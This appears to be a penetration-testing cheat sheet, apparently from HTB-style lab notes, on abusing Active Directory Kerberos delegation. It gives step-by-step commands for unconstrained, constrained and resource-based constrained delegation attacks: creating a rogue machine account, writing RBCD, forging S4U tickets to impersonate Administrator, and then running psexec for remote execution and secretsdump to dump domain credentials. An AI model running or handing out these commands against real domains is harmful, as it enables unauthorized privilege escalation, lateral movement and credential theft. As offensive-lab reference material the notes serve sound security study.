title: delegation
html:
delegation

> Abuse delegation configurations to impersonate users on target services.

Unconstrained Delegation

When: Computer/user has TRUSTED_FOR_DELEGATION flag. Any TGT presented is cached.

# Find unconstrained delegation
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName

# Coerce target to authenticate → capture TGT → PTT
# Use Rubeus monitor or mimikatz sekurlsa::tickets

Constrained Delegation (S4U2Self + S4U2Proxy)

When: msDS-AllowedToDelegateTo is set on an account you control.

getST.py 'domain/user:pass' -spn 'cifs/target.domain.htb' -impersonate Administrator -dc-ip DC_IP

# Alternative service name (-altservice) for service ticket substitution
getST.py 'domain/user:pass' -spn 'HTTP/target.domain.htb' -impersonate Administrator -altservice 'CIFS/DC.domain.htb' -dc-ip DC_IP

Resource-Based Constrained Delegation (RBCD)

When: You have GenericWrite/GenericAll/WriteAccountRestrictions on a computer object + MAQ > 0.

Step 1: Create machine account

addcomputer.py 'domain/user:pass' -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip DC_IP

Step 2: Set RBCD

rbcd.py 'domain/user:pass' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP

Step 3: S4U2Proxy

getST.py 'domain/FAKE01$:FakePass123!' -spn cifs/TARGET.domain.htb -impersonate Administrator -dc-ip DC_IP

Step 4: Use the ticket

export KRB5CCNAME=Administrator@cifs_TARGET.domain.htb@DOMAIN.HTB.ccache
psexec.py -k -no-pass 'domain/Administrator@TARGET.domain.htb'
secretsdump.py -k -no-pass 'domain/Administrator@TARGET.domain.htb'

Clock Skew

All Kerberos operations in exegol need faketime:

faketime '+8 hours' getST.py ...
